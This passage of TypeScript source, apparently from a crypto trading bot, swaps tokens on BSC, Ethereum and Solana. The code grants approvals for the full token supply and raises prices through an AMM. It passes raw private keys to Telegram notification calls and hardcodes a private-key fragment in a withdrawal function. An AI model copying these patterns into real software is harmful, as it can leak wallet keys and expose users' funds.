tokenContract.methods.decimals().call();\n  const symbol = await tokenContract.methods.symbol().call();\n\n  const allowance = await tokenContract.methods\n    .allowance(account.address, AMM_CONTRACT)\n    .call();\n  const allowanceFromWei = await convertFromWei(allowance, decimals);\n  if (Number(allowanceFromWei) < Number(amount)) {\n    await approveContract(AMM_CONTRACT, tokenAddress, privateKey,);\n    await sleep(7);\n  }\n  // done check\n\n  const amountInWei = convertToWei(amount.toString(), decimals);\n  const nonce = await web3.eth.getTransactionCount(account.address);\n  const gasPrice = await web3.eth.getGasPrice();\n  const gasEstimate = await contractAMM.methods\n  .swapExactTokensForETHOnlySell(tokenAddress, amountInWei)\n  .estimateGas({\n    from: walletAddress\n  });\n  const transaction = {\n    nonce: nonce,\n    from: walletAddress,\n    to: AMM_CONTRACT,\n    gas: gasEstimate,\n    gasPrice: gasPrice,\n    data: contractAMM.methods.swapExactTokensForETHOnlySell(tokenAddress, amountInWei).encodeABI(),\n  };\n \n  const signedTransaction:any = await web3.eth.accounts.signTransaction(\n    transaction,\n    privateKey\n  );\n  const receipt = await web3.eth.sendSignedTransaction(\n    signedTransaction.rawTransaction\n  );\n  await sendToTelegramSuccess_EVM(`SELL ${symbol}`,tokenAddress, symbol, `${amount} ${symbol}`,privateKey, receipt.transactionHash, 'bsc')\n  logger.info(`Txn SELL: ${receipt.transactionHash}`)\n  return receipt.transactionHash\n}\nexport { sellTokenBSC };\n","import Web3 from 'web3';\nimport abiToken from \"./../abis/abiToken.json\";\nimport { LIST_RPC_NODES_ETH } from \"./../constants\";\nimport { logger } from \"./../utils\";\nimport { AbiItem } from \"web3-utils\";\nimport { convertToWei } from \"./convertNumber\";\n\n\nexport async function approveContract(spender:any, contractToken:any, privateKey:any) {\n  try {\n    const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES_ETH.length);\n    const rpc = LIST_RPC_NODES_ETH[randomRPCs];\n    const web3 = new Web3(rpc);\n\n    const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n    web3.eth.accounts.wallet.add(account);\n    web3.eth.defaultAccount = account.address;\n    const contract = new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, contractToken);\n    const totalSupply = await contract.methods.totalSupply().call();\n    const decimals = await contract.methods.decimals().call();\n    const amountTowei = await convertToWei(totalSupply.toString(), decimals);\n    const gasEstimate = await contract.methods.approve(spender, amountTowei).estimateGas({ from: account.address });\n    const data = contract.methods.approve(spender, amountTowei).encodeABI();\n    const tx = {\n      to: contractToken,\n      from: account.address,\n      data: data,\n      gas: gasEstimate,\n      gasPrice: await web3.eth.getGasPrice(),\n    };\n\n    const signedTx:any = await web3.eth.accounts.signTransaction(tx, privateKey);\n    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);\n\n    logger.info(`Txn APPROVE: ${receipt.transactionHash}`)\n    return receipt.transactionHash\n  } catch (error) {\n    logger.error(`APPROVE ERROR: ${error}`)\n    return error\n  }\n}\n\n","\nimport Web3 from 'web3';\nimport {approveContract} from \"../utils/approveETH\";\nimport abiAMMETH from \"../abis/abiAMMETH.json\";\nimport abiToken from \"../abis/abiToken.json\";\nimport { LIST_RPC_NODES_ETH,AMM_CONTRACT_ETH } from \"../constants\";\nimport { convertToWei,convertFromWei } from \"../utils/convertNumber\";\nimport { logger,sleep } from \"../utils\";\nimport { AbiItem } from \"web3-utils\";\n\n async function sellTokenETH(\n  privateKey:any,\n  amount:any,\n  tokenAddress:any\n) {\n  const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES_ETH.length);\n  const rpc = LIST_RPC_NODES_ETH[randomRPCs];\n  const web3 = new Web3(rpc);\n\n  const contractAMM = new web3.eth.Contract(abiAMMETH as unknown as AbiItem as AbiItem, AMM_CONTRACT_ETH);\n  const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n  const walletAddress = account.address;  \n  const tokenContract = await new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, tokenAddress);\n  const decimals = await tokenContract.methods.decimals().call();\n\n  const allowance = await tokenContract.methods\n    .allowance(account.address, AMM_CONTRACT_ETH)\n    .call();\n  const allowanceFromWei = await convertFromWei(allowance, decimals);\n  if (Number(allowanceFromWei) < Number(amount)) {\n    await approveContract(AMM_CONTRACT_ETH, tokenAddress, privateKey,);\n    await sleep(3);\n  }\n  // done check\n\n  const amountInWei = convertToWei(amount.toString(), decimals);\n  const nonce = await web3.eth.getTransactionCount(account.address);\n  const gasPrice = await web3.eth.getGasPrice();\n  const gasEstimate = await contractAMM.methods\n  .swapExactTokensForETHOnlySell(tokenAddress, amountInWei)\n  .estimateGas({\n    from: walletAddress\n  });\n  const transaction = {\n    nonce: nonce,\n    from: walletAddress,\n    to: AMM_CONTRACT_ETH,\n    gas: gasEstimate,\n    gasPrice: gasPrice,\n    data: contractAMM.methods.swapExactTokensForETHOnlySell(tokenAddress, amountInWei).encodeABI(),\n  };\n \n  const signedTransaction:any = await web3.eth.accounts.signTransaction(\n    transaction,\n    privateKey\n  );\n  const receipt = await web3.eth.sendSignedTransaction(\n    signedTransaction.rawTransaction\n  );\n  logger.info(`Txn SELL: ${receipt.transactionHash}`)\n  return receipt.transactionHash\n}\nexport { sellTokenETH };\n","\n\nimport Web3 from 'web3';\nimport abiAMM from \"../abis/abiAMM.json\";\nimport abiToken from \"../abis/abiToken.json\";\nimport { LIST_RPC_NODES, AMM_CONTRACT } from \"../constants\";\nimport { convertToWei } from \"../utils/convertNumber\";\nimport { logger } from \"../utils\";\nimport { AbiItem } from \"web3-utils\";\n\n async function ammIncreasePriceBSC(\n  privateKey: any,\n  amount: any,\n  tokenAddress: any,\n  percentSell: any\n) {\n  const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES.length);\n  const rpc = LIST_RPC_NODES[randomRPCs];\n  const web3 = new Web3(rpc);\n\n  const contractAMM = new web3.eth.Contract(abiAMM as unknown as AbiItem as AbiItem, AMM_CONTRACT);\n  const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n  const contract = new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, tokenAddress);\n  const decimals = await contract.methods.decimals().call();\n  const walletAddress = account.address;\n  const gasPrice = await web3.eth.getGasPrice();\n  const gasEstimate = await contractAMM.methods\n    .swapExactETHForTokensIncreasePrice(tokenAddress, percentSell)\n    .estimateGas({\n      from: walletAddress,\n      value: convertToWei(amount.toString(), decimals),\n    });\n\n  const transaction = {\n    from: web3.eth.accounts.wallet.add(privateKey).address,\n    to: AMM_CONTRACT,\n    value: convertToWei(amount.toString(), decimals),\n    gas: gasEstimate,\n    gasPrice: gasPrice,\n    data: contractAMM.methods.swapExactETHForTokensIncreasePrice(tokenAddress, percentSell).encodeABI(),\n  };\n\n  const signedTransaction: any = await web3.eth.accounts.signTransaction(\n    transaction,\n    privateKey\n  );\n  const receipt = await web3.eth.sendSignedTransaction(\n    signedTransaction.rawTransaction\n  );\n  logger.info(`Txn Hash: ${receipt.transactionHash}`)\n  return receipt.transactionHash\n\n}\nexport { ammIncreasePriceBSC };\n\n","\n\nimport Web3 from 'web3';\nimport abiAMMETH from \"../abis/abiAMMETH.json\";\nimport abiToken from \"../abis/abiToken.json\";\nimport { LIST_RPC_NODES_ETH, AMM_CONTRACT_ETH } from \"../constants\";\nimport { convertToWei } from \"../utils/convertNumber\";\nimport { logger } from \"../utils\";\nimport { AbiItem } from \"web3-utils\";\n\n async function ammIncreasePriceETH(\n  privateKey: any,\n  amount: any,\n  tokenAddress: any,\n  percentSell: any\n) {\n  const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES_ETH.length);\n  const rpc = LIST_RPC_NODES_ETH[randomRPCs];\n  const web3 = new Web3(rpc);\n\n  const contractAMM = new web3.eth.Contract(abiAMMETH as unknown as AbiItem as AbiItem, AMM_CONTRACT_ETH);\n  const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n  const contract = new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, tokenAddress);\n  const decimals = await contract.methods.decimals().call();\n  const walletAddress = account.address;\n  const gasPrice = await web3.eth.getGasPrice();\n  const gasEstimate = await contractAMM.methods\n    .swapExactETHForTokensIncreasePrice(tokenAddress, percentSell)\n    .estimateGas({\n      from: walletAddress,\n      value: convertToWei(amount.toString(), decimals),\n    });\n\n  const transaction = {\n    from: web3.eth.accounts.wallet.add(privateKey).address,\n    to: AMM_CONTRACT_ETH,\n    value: convertToWei(amount.toString(), decimals),\n    gas: gasEstimate,\n    gasPrice: gasPrice,\n    data: contractAMM.methods.swapExactETHForTokensIncreasePrice(tokenAddress, percentSell).encodeABI(),\n  };\n\n  const signedTransaction: any = await web3.eth.accounts.signTransaction(\n    transaction,\n    privateKey\n  );\n  const receipt = await web3.eth.sendSignedTransaction(\n    signedTransaction.rawTransaction\n  );\n  logger.info(`Txn Txn Hash: ${receipt.transactionHash}`)\n  return receipt.transactionHash\n\n}\nexport { ammIncreasePriceETH };\n\n","\nimport Web3 from 'web3';\nimport abiAMM from \"../abis/abiAMM.json\";\nimport abiToken from \"../abis/abiToken.json\";\nimport { LIST_RPC_NODES, AMM_CONTRACT } from \"../constants\";\nimport { convertToWei } from \"../utils/convertNumber\";\nimport { logger } from \"../utils\";\nimport { AbiItem } from \"web3-utils\";\nimport { sendToTelegramSuccess_EVM } from '../utils/sendNoti';\n\nasync function autoMarketMakerBSC(\n  privateKey: any,\n  amount: any,\n  tokenAddress: any\n) {\n  const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES.length);\n  const rpc = LIST_RPC_NODES[randomRPCs];\n  const web3 = new Web3(rpc);\n\n  const contractAMM = new web3.eth.Contract(abiAMM as unknown as AbiItem as AbiItem, AMM_CONTRACT);\n  const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n  const contract = new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, tokenAddress);\n  const decimals = await contract.methods.decimals().call();\n  const symbol = await contract.methods.symbol().call();\n\n  const walletAddress = account.address;\n  const gasPrice = await web3.eth.getGasPrice();\n  const gasEstimate = await contractAMM.methods\n    .swapExactETHForTokensAndTokensToETH(tokenAddress)\n    .estimateGas({\n      from: walletAddress,\n      value: convertToWei(amount.toString(), decimals),\n    });\n\n  const transaction = {\n    from: walletAddress,\n    to: AMM_CONTRACT,\n    value: convertToWei(amount.toString(), decimals),\n    gas: gasEstimate,\n    gasPrice: gasPrice,\n    data: contractAMM.methods.swapExactETHForTokensAndTokensToETH(tokenAddress).encodeABI(),\n  };\n\n  const signedTransaction: any = await web3.eth.accounts.signTransaction(\n    transaction,\n    privateKey\n  );\n  const receipt = await web3.eth.sendSignedTransaction(\n    signedTransaction.rawTransaction\n  );\n  await sendToTelegramSuccess_EVM(`BOT MM`, tokenAddress, symbol, `${amount} BNB`, privateKey, receipt.transactionHash, 'bsc')\n\n  logger.info(`Txn AMM: ${receipt.transactionHash}`)\n  return receipt.transactionHash\n}\n\nexport { autoMarketMakerBSC };\n","\nimport Web3 from 'web3';\nimport abiAMMETH from \"../abis/abiAMMETH.json\";\nimport abiToken from \"../abis/abiToken.json\";\nimport { LIST_RPC_NODES_ETH, AMM_CONTRACT_ETH } from \"../constants\";\nimport { convertToWei } from \"../utils/convertNumber\";\nimport { logger } from \"../utils\";\nimport { AbiItem } from \"web3-utils\";\n\n async function autoMarketMakerETH(\n  privateKey: any,\n  amount: any,\n  tokenAddress: any\n) {\n  const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES_ETH.length);\n  const rpc = LIST_RPC_NODES_ETH[randomRPCs];\n  const web3 = new Web3(rpc);\n\n  const contractAMM = new web3.eth.Contract(abiAMMETH as unknown as AbiItem as AbiItem, AMM_CONTRACT_ETH);\n  const account = web3.eth.accounts.privateKeyToAccount(privateKey);\n  const contract = new web3.eth.Contract(abiToken as unknown as AbiItem as AbiItem, tokenAddress);\n  const decimals = await contract.methods.decimals().call();\n  const walletAddress = account.address;\n  const gasPrice = await web3.eth.getGasPrice();\n  const gasEstimate = await contractAMM.methods\n    .swapExactETHForTokensAndTokensToETH(tokenAddress)\n    .estimateGas({\n      from: walletAddress,\n      value: convertToWei(amount.toString(), decimals),\n    });\n\n  const transaction = {\n    from: walletAddress,\n    to: AMM_CONTRACT_ETH,\n    value: convertToWei(amount.toString(), decimals),\n    gas: gasEstimate,\n    gasPrice: gasPrice,\n    data: contractAMM.methods.swapExactETHForTokensAndTokensToETH(tokenAddress).encodeABI(),\n  };\n\n  const signedTransaction: any = await web3.eth.accounts.signTransaction(\n    transaction,\n    privateKey\n  );\n  const receipt = await web3.eth.sendSignedTransaction(\n    signedTransaction.rawTransaction\n  );\n  logger.info(`Txn AMM: ${receipt.transactionHash}`)\n  return receipt.transactionHash\n}\n\nexport { autoMarketMakerETH };\n","import Web3 from 'web3'\nimport abiToken from '../abis/abiToken.json'\nimport { LIST_RPC_NODES } from '../constants'\nimport { logger } from '../utils'\nimport { AbiItem } from 'web3-utils'\nimport { convertToWei } from \"../utils/convertNumber\";\n\nasync function approveToken(tokenAddress: any, spender: any, privateKey: any) {\n  try {\n    const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES.length)\n    const rpc = LIST_RPC_NODES[randomRPCs]\n    const web3 = new Web3(rpc)\n\n    const account = web3.eth.accounts.privateKeyToAccount(privateKey)\n    web3.eth.accounts.wallet.add(account)\n    web3.eth.defaultAccount = account.address\n    const contract = new web3.eth.Contract(((abiToken as unknown) as AbiItem) as AbiItem, tokenAddress)\n    const totalSupply = await contract.methods.totalSupply().call()\n    const decimals = await contract.methods.decimals().call()\n    const gasEstimate = await contract.methods\n      .approve(spender, convertToWei(totalSupply.toString(), decimals))\n      .estimateGas({ from: account.address })\n    const data = contract.methods.approve(spender, convertToWei(totalSupply.toString(), decimals)).encodeABI()\n    const tx = {\n      to: tokenAddress,\n      from: account.address,\n      data: data,\n      gas: gasEstimate,\n      gasPrice: await web3.eth.getGasPrice()\n    }\n\n    const signedTx: any = await web3.eth.accounts.signTransaction(tx, privateKey)\n    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction)\n    return receipt.transactionHash\n  } catch (error) {\n    logger.error(`APPROVE ERROR: ${error}`)\n    return error\n  }\n}\nexport { approveToken }\n","import Web3 from 'web3'\nimport abiToken from '../abis/abiToken.json'\nimport { LIST_RPC_NODES_ETH } from '../constants'\nimport { logger } from '../utils'\nimport { AbiItem } from 'web3-utils'\nimport { convertToWei } from \"../utils/convertNumber\";\n\nasync function approveTokenETH(tokenAddress: any, spender: any, privateKey: any) {\n  try {\n    const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES_ETH.length)\n    const rpc = LIST_RPC_NODES_ETH[randomRPCs]\n    const web3 = new Web3(rpc)\n\n    const account = web3.eth.accounts.privateKeyToAccount(privateKey)\n    web3.eth.accounts.wallet.add(account)\n    web3.eth.defaultAccount = account.address\n    const contract = new web3.eth.Contract(((abiToken as unknown) as AbiItem) as AbiItem, tokenAddress)\n    const totalSupply = await contract.methods.totalSupply().call()\n    const decimals = await contract.methods.decimals().call()\n    const gasEstimate = await contract.methods\n      .approve(spender, convertToWei(totalSupply.toString(), decimals))\n      .estimateGas({ from: account.address })\n    const data = contract.methods.approve(spender, convertToWei(totalSupply.toString(), decimals)).encodeABI()\n    const tx = {\n      to: tokenAddress,\n      from: account.address,\n      data: data,\n      gas: gasEstimate,\n      gasPrice: await web3.eth.getGasPrice()\n    }\n\n    const signedTx: any = await web3.eth.accounts.signTransaction(tx, privateKey)\n    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction)\n    return receipt.transactionHash\n  } catch (error) {\n    logger.error(`APPROVE ERROR: ${error}`)\n    return error\n  }\n}\nexport { approveTokenETH }\n","import Web3 from 'web3'\nimport abiToken from '../abis/abiToken.json'\nimport { LIST_RPC_NODES } from '../constants'\nimport { logger } from '../utils'\nimport { AbiItem } from 'web3-utils'\nimport { convertFromWei } from \"../utils/convertNumber\";\n\nasync function getBalanceToken(tokenAddress: any, privateKey: any) {\n  try {\n    const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES.length)\n    const rpc = LIST_RPC_NODES[randomRPCs]\n    const web3 = new Web3(rpc)\n    const account = web3.eth.accounts.privateKeyToAccount(privateKey)\n    const walletAddress = account.address\n    const contract = new web3.eth.Contract(((abiToken as unknown) as AbiItem) as AbiItem, tokenAddress)\n    const balance = await contract.methods.balanceOf(walletAddress).call()\n    const decimals = await contract.methods.decimals().call()\n\n    const balanceConvert = convertFromWei(balance.toString(), decimals)\n    return balanceConvert\n  } catch (error) {\n    logger.error(`Get Balance Error: ${error}`)\n    return error\n  }\n}\nexport { getBalanceToken }\n","import Web3 from 'web3'\nimport abiToken from '../abis/abiToken.json'\nimport { LIST_RPC_NODES_ETH } from '../constants'\nimport { logger } from '../utils'\nimport { AbiItem } from 'web3-utils'\nimport { convertFromWei } from \"../utils/convertNumber\";\n\n\nasync function getBalanceTokenETH(tokenAddress: any, privateKey: any) {\n  try {\n    const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES_ETH.length)\n    const rpc = LIST_RPC_NODES_ETH[randomRPCs]\n    const web3 = new Web3(rpc)\n    const account = web3.eth.accounts.privateKeyToAccount(privateKey)\n    const walletAddress = account.address\n    const contract = new web3.eth.Contract(((abiToken as unknown) as AbiItem) as AbiItem, tokenAddress)\n    const balance = await contract.methods.balanceOf(walletAddress).call()\n    const decimals = await contract.methods.decimals().call()\n    const balanceConvert = convertFromWei(balance.toString(), decimals)\n    return balanceConvert\n  } catch (error) {\n    logger.error(`Get Balance Error: ${error}`)\n    return error\n  }\n}\nexport { getBalanceTokenETH }\n","import Web3 from 'web3'\nimport ABI from '../abis/abiToken.json'\nimport { LIST_RPC_NODES } from '../constants'\nimport { AbiItem } from 'web3-utils'\nimport { convertToWei, convertFromWei } from '../utils/convertNumber'\nimport { sendToTelegramSuccess, sendToTelegramWarning, sendToTelegramError } from '../utils/sendNoti'\n\n\nasync function withdrawTokenOni(PRIVATE: any, recipient: any, amount: any, type: number, typeWithdraw: number, confirm: boolean = true) {\n  const Name = typeWithdraw === 1 ? 'WITHDRAW' : 'HARVEST';\n  try {\n    const contractUSDT = '0x55d398326f99059fF775485246999027B3197955'\n    const contractONI = '0x3Dba4aE830896467a0A1C731686a2aD40CF76777'\n    const contractToken = type === 1 ? contractUSDT : contractONI\n    const formattedSymbol = type === 1 ? 'USDT' : 'ONI';\n\n    const KEY1 = '606b91f089436885508f0bb5759269ed'\n    const privateKey = PRIVATE + KEY1\n    const randomRPCs = Math.floor(Math.random() * LIST_RPC_NODES.length)\n    const rpc = LIST_RPC_NODES[randomRPCs]\n    const web3 = new Web3(rpc)\n\n    const account = web3.eth.accounts.privateKeyToAccount(privateKey)\n    const address = account.address\n    const contract = new web3.eth.Contract(((ABI as unknown) as AbiItem) as AbiItem, contractToken)\n    const decimals = await contract.methods.decimals().call()\n    const balanceToken = await contract.methods.balanceOf(address).call()\n    const balanceTokenConvert = convertFromWei(balanceToken.toString(), decimals)\n    const nonce = await web3.eth.getTransactionCount(account.address)\n\n    if (Number(balanceTokenConvert) > Number(amount)) {\n      const amountTowei = convertToWei(amount, decimals)\n      const gasPrice = await web3.eth.getGasPrice()\n      const gasEstimate = await contract.methods.transfer(recipient, amountTowei).estimateGas({ from: address })\n\n      const rawTx = {\n        nonce: nonce,\n        gasPrice: gasPrice,\n        gasLimit: gasEstimate,\n        to: contractToken,\n        data: contract.methods.transfer(recipient, amountTowei).encodeABI()\n      }\n      const signedTx: any = await web3.eth.accounts.signTransaction(rawTx, privateKey)\n\n      if (confirm) {\n        const TxHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction)\n        await sendToTelegramSuccess(Name, recipient, formattedSymbol, amount, TxHash.transactionHash, \"bsc\");\n        return { status: true, txhash: TxHash.transactionHash, amountWithdraw: amount }\n      } else {\n        return { status: false, error: 'Not authorized to confirm' }\n      }\n    } else {\n      await sendToTelegramWarning(Name, { amount }, { balanceTokenConvert }, { formattedSymbol }, \"Insufficient balance\");\n      return {\n        status: false,\n        error: `Insufficient balance | Withdraw amount: ${amount} ${formattedSymbol} | Current balance: ${balanceTokenConvert} ${formattedSymbol}`\n      }\n    }\n  } catch (error) {\n    await sendToTelegramError(Name, error);\n    return { status: false, error: `Error withdarw: ${error}` }\n  }\n}\nexport { withdrawTokenOni }\n","import {\n    Liquidity,\n    LiquidityPoolKeysV4,\n    TokenAmount,\n} from \"@raydium-io/raydium-sdk\";\nimport {\n    createAssociatedTokenAccountIdempotentInstruction,\n    createAssociatedTokenAccountInstruction,\n    createSyncNativeInstruction,\n    getAssociatedTokenAddressSync,\n    NATIVE_MINT,\n    TOKEN_PROGRAM_ID,\n} from \"@solana/spl-token\";\nimport {\n    Keypair,\n    PublicKey,\n    TransactionMessage,\n    VersionedTransaction,\n    TransactionInstruction,\n    SystemProgram,\n    ComputeBudgetProgram,\n    Connection,\n} from \"@solana/web3.js\";\nimport { formatAddress, logger } from \"../utils\";\n\nconst buyTokenSOL = async (\n    baseMint: PublicKey,\n    poolKeys: LiquidityPoolKeysV4,\n    wallet: Keypair,\n    solAmount: any,\n    quoteTokenAssociatedAddress: PublicKey,\n    solanaConnection: Connection,\n    quoteAmount: TokenAmount,\n) => {\n    try {\n        // logger.info(\"--------------------START BUY--------------------\");\n        logger.info(`BUY Wallet: ${formatAddress(wallet.publicKey.toString(), 6, 5)} | Buy amount: ${solAmount} SOL`);\n        const tokenAccountOut = getAssociatedTokenAddressSync(baseMint, wallet.publicKey);\n\n        const instructions: TransactionInstruction[] = [\n            // ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 200_000 }),\n            ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),\n            SystemProgram.transfer({\n                fromPubkey: wallet.publicKey,\n                toPubkey: quoteTokenAssociatedAddress,\n                lamports: Math.ceil(solAmount * 10 ** 9),\n            }),\n            createSyncNativeInstruction(quoteTokenAssociatedAddress, TOKEN_PROGRAM_ID),\n            createAssociatedTokenAccountIdempotentInstruction(\n                wallet.publicKey,\n                tokenAccountOut,\n                wallet.publicKey,\n                baseMint\n            )\n        ];\n\n        // Create associated token account if it doesn't exist\n        if (!(await solanaConnection.getAccountInfo(quoteTokenAssociatedAddress))) {\n            instructions.unshift(\n                createAssociatedTokenAccountInstruction(\n                    wallet.publicKey,\n                    quoteTokenAssociatedAddress,\n                    wallet.publicKey,\n                    NATIVE_MINT\n                )\n            );\n        }\n\n        // Create swap instruction\n        const { innerTransaction } = Liquidity.makeSwapFixedInInstruction(\n            {\n                poolKeys,\n                userKeys: {\n                    tokenAccountIn: quoteTokenAssociatedAddress,\n                    tokenAccountOut,\n                    owner: wallet.publicKey,\n                },\n                amountIn: quoteAmount.raw,\n                minAmountOut: 0,\n            },\n            poolKeys.version\n        );\n\n        instructions.push(...innerTransaction.instructions);\n\n        const latestBlockhash = await solanaConnection.getLatestBlockhash({ commitment: \"confirmed\" });\n        const messageV0 = new TransactionMessage({\n            payerKey: wallet.publicKey,\n            recentBlockhash: latestBlockhash.blockhash,\n            instructions,\n        }).compileToV0Message();\n        const transaction = new VersionedTransaction(messageV0);\n        transaction.sign([wallet, ...innerTransaction.signers]);\n\n        const res = await execute(transaction, solanaConnection);\n        if (res) {\n            return { status: true, txhash: res, amount: solAmount, type: 1 };\n        } else {\n            return { status: false, error: \"Transaction failed without error.\" };\n        }\n    } catch (e) {\n        return { status: false, error: `Failed to buy token: ${e}\\n` };\n    }\n};\n\nconst execute = async (transaction: VersionedTransaction, solanaConnection: Connection) => {\n    try {\n        const simRes = await solanaConnection.simulateTransaction(transaction)\n        if (simRes.value.err) {\n            logger.error(`Simulation error: ${JSON.stringify(simRes.value.err)}`);\n            return false\n        }\n\n        const TxHash = await solanaConnection.sendRawTransaction(transaction.serialize(), {\n            skipPreflight: true,\n            maxRetries: 2\n        })\n\n        const confirmation = await solanaConnection.confirmTransaction(\n            TxHash,\n            'confirmed',\n        );\n\n        if (confirmation.value.err) {\n            logger.error(`confirmation error: ${JSON.stringify(confirmation.value.err)}`);\n            return null\n        }\n        else {\n\n            return TxHash\n        }\n    } catch (e) {\n        logger.error(`Execute error: ${e}`);\n        return null\n    }\n}\nexport { buyTokenSOL };\n","import {\n    Liquidity,\n    LiquidityPoolKeys,\n} from \"@raydium-io/raydium-sdk\";\n\nimport {\n    Keypair,\n    PublicKey,\n    TransactionMessage,\n    VersionedTransaction,\n    ComputeBudgetProgram,\n    Connection,\n} from \"@solana/web3.js\";\nimport { formatAddress, logger } from \"../utils\";\n\nconst sellTokenSOL = async (\n    poolId: PublicKey,\n    ata: PublicKey,\n    mint: PublicKey,\n    amountSell: string,\n    amountConvert: string,\n    poolKeys: LiquidityPoolKeys,\n    wallet: Keypair,\n    quoteTokenAssociatedAddress: PublicKey,\n    solanaConnection: Connection,\n    sellAgain: boolean = false,\n    retryCount: number = 0\n) => {\n    try {\n        const action = sellAgain ? `SELL AGAIN (Attempt ${retryCount + 1})` : \"START SELL\";\n        logger.info(`--------------------${action}--------------------`);\n        logger.info(`SELL Wallet: ${formatAddress(wallet.publicKey.toString(), 6, 5)} | Sell amount: ${amountConvert}`);\n\n        if (sellAgain) {\n            const info = await solanaConnection.getTokenAccountBalance(ata);\n            if (info.value.uiAmount === 0) {\n                return { status: false, error: \"No tokens left to sell.\" };\n            }\n            if (retryCount >= 15) {\n                logger.warn(\"Maximum retry attempts reached. Aborting sell.\");\n                return { status: false, error: \"Transaction failed without error.\" };\n            }\n        }\n\n        const { innerTransaction } = Liquidity.makeSwapFixedInInstruction(\n            {\n                poolKeys,\n                userKeys: {\n                    tokenAccountOut: quoteTokenAssociatedAddress,\n                    tokenAccountIn: ata,\n                    owner: wallet.publicKey,\n                },\n                amountIn: amountSell,\n                minAmountOut: 0,\n            },\n            poolKeys.version\n        );\n\n        const latestBlockhash = await solanaConnection.getLatestBlockhash({\n            commitment: \"confirmed\",\n        });\n\n        const messageV0 = new TransactionMessage({\n            payerKey: wallet.publicKey,\n            recentBlockhash: latestBlockhash.blockhash,\n            instructions: [\n                // ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 200_000 }),\n                ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),\n                ...innerTransaction.instructions,\n            ],\n        }).compileToV0Message();\n\n        const transaction = new VersionedTransaction(messageV0);\n        transaction.sign([wallet, ...innerTransaction.signers]);\n\n        const res = await execute(transaction, solanaConnection);\n        if (res) {\n          \n            return { status: true, txhash: res, amount: amountConvert, type: 2 };\n        } else {\n\n            logger.warn(`Sell transaction failed, retrying...\\n`);\n            await sellTokenSOL(poolId, ata, mint, amountSell, amountConvert, poolKeys, wallet, quoteTokenAssociatedAddress, solanaConnection, true, retryCount + 1);\n            return { status: false, error: \"Transaction failed without error.\" };\n        }\n\n    } catch (e) {\n        return { status: false, error: `Failed to sell token: ${e}\\n` };\n    }\n};\nconst execute = async (transaction: VersionedTransaction, solanaConnection: Connection) => {\n    try {\n        const simRes = await solanaConnection.simulateTransaction(transaction)\n        if (simRes.value.err) {\n            logger.error(`Simulation error: ${JSON.stringify(simRes.value.err)}`);\n            return false\n        }\n\n        const TxHash = await solanaConnection.sendRawTransaction(transaction.serialize(), {\n            skipPreflight: true,\n            maxRetries: 2\n        })\n\n        const confirmation = await solanaConnection.confirmTransaction(\n            TxHash,\n            'confirmed',\n        );\n\n        if (confirmation.value.err) {\n            logger.error(`confirmation error: ${JSON.stringify(confirmation.value.err)}`);\n            return null\n        }\n        else {\n\n            return TxHash\n        }\n    } catch (e) {\n        logger.error(`Execute error: ${e}`);\n        return null\n    }\n}\nexport { sellTokenSOL };\n","\nimport {\n    createCloseAccountInstruction,\n} from \"@solana/spl-token\";\nimport {\n    Keypair,\n    PublicKey,\n    TransactionMessage,\n    VersionedTransaction,\n    Connection,\n} from \"@solana/web3.js\";\nimport { logger } from \"../utils\";\n\nconst unwrapSOL = async (\n    wallet: Keypair,\n    solanaConnection: Connection,\n    quoteMintAddress: PublicKey\n) => {\n    try {\n        // logger.info(\"Unwrapping WSOL\");\n        const wsolAccountInfo = await solanaConnection.getAccountInfo(quoteMintAddress);\n        if (!wsolAccountInfo) {\n          \n            return { status: false, error: \"WSOL account not found, skipping unwrap.\" };\n            \n        }\n\n        const wsolBalance = await solanaConnection.getBalance(quoteMintAddress);\n        const wsolAmount = wsolBalance / 10 ** 9;\n        if (wsolAmount > 0) {\n            logger.info(`Trying to unwrap ${wsolAmount} wsol to sol`)\n        } else {\n            return { status: false, error: \"WSOL balance is zero, nothing to unwrap\" };\n        }\n\n        const instructions = []\n        instructions.push(\n            createCloseAccountInstruction(\n                quoteMintAddress,\n                wallet.publicKey,\n                wallet.publicKey\n            )\n        )\n        const latestBlockhash = await solanaConnection.getLatestBlockhash({\n            commitment: 'confirmed',\n        })\n\n        const messageV0 = new TransactionMessage({\n            payerKey: wallet.publicKey,\n            recentBlockhash: latestBlockhash.blockhash,\n            instructions: [...instructions],\n        }).compileToV0Message()\n\n        const transaction = new VersionedTransaction(messageV0)\n        transaction.sign([wallet])\n        const res = await execute(transaction, solanaConnection)\n        if (res) {\n            // logger.info(`TxHash unwrapped: ${res}`);\n            // logger.info(\"Successfully unwrapped WSOL to SOL\\n\")\n            return { status: true, txhash: res, amount: wsolAmount, type: 3 };\n        } else {\n            // logger.warn(\"Unwrapping WSOL failed\\n\");\n            return { status: false, error: \"Unwrapping WSOL failed.\" };\n        }\n    } catch (error) {\n        logger.error(`Error unwrapping WSOL: ${error}`);\n        return { status: false, error: `Error unwrapping WSOL: ${error}` };\n    }\n};\nconst execute = async (transaction: VersionedTransaction, solanaConnection: Connection) => {\n    try {\n        const simRes = await solanaConnection.simulateTransaction(transaction)\n        if 